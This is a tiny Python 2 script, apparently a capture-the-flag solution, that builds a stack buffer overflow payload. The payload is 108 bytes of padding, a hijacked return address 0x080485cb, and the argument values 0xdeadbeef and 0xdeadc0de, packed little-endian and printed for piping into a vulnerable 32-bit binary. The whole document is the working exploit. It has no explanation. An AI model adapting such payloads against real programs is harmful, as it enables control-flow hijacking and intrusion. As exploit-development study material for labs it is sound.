import struct;
x=lambda a: struct.pack("<I",a);
p='D'*108;
p +=x(0x41414141);
p +=x(0x080485cb);
p +=x(0x41414141);
p +=x(0xdeadbeef);
p +=x(0xdeadc0de);
print p
